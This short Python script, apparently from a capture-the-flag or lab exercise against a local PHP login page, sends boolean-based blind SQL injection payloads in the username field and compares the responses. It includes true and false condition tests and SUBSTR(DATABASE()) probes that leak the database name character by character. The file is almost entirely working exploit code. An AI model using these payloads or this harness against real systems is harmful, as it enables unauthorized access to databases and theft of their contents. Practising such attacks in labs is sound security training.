import requests

target = "http://127.0.0.1:32895/index.php"

print("[*] Debugging SQL injection responses\n")

# Test various payloads
payloads = [
    ("admin' AND 1=1-- -", "True condition"),
    ("admin' AND 1=0-- -", "False condition"),
    ("admin' AND 'a'='a'-- -", "True string match"),
    ("admin' AND 'a'='b'-- -", "False string match"),
    ("admin' AND SUBSTR(DATABASE(),1,1)='a'-- -", "DB starts with 'a'"),
    ("admin' AND SUBSTR(DATABASE(),1,1)='z'-- -", "DB starts with 'z'"),
    ("admin", "Normal username"),
    ("invalid_user", "Invalid username"),
]

for payload, description in payloads:
    r = requests.get(target, params={'username': payload, 'password': 'test'}, timeout=3)
    print(f"[{description}]")
    print(f"  Payload: {payload}")
    print(f"  Status: {r.status_code}")
    print(f"  Length: {len(r.text)}")
    print(f"  Contains 'not the admin': {'not the admin' in r.text}")
    print(f"  Response: {r.text[:200]}")
    print()

